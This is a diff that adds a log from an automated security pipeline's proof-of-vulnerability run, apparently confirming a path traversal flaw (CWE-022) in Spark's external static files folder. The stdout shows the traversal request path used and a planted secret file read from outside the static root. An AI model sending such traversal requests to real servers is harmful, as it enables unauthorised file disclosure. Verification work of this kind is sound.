@@ -1,0 +1,16 @@
+$ docker run --rm -v /Users/mohsen/dev/personal/autosec/security_pipeline_runs/20260708_011614_finding-278ac32699a6/worktree:/workspace/repo -w /workspace/repo simpleautosec-finding-278ac32699a6:ca4e47d0d22b bash -lc bash .security-pipeline/pov/run_pov.sh
+exit_code=0
+timed_out=false
+
+--- stdout ---
+[pov] configured external folder : /tmp/pov_ext_base
+[pov] StaticFilesFolder.external(): tmp/pov_ext_base
+[pov] attack request path        : /..\pov_ext_base_secret\secret.txt
+[pov] served file                : /tmp/pov_ext_base_secret/secret.txt
+[pov] served content             : TOP_SECRET_OUTSIDE_STATIC_ROOT
+[pov] escapes configured folder  : true
+[pov] VULNERABLE: read a file OUTSIDE the external static folder via path traversal (CWE-022).
+
+--- stderr ---
+[main] WARN spark.staticfiles.StaticFilesFolder - Registering external static files folder [/tmp/pov_ext_base] as [/tmp/pov_ext_base].
+
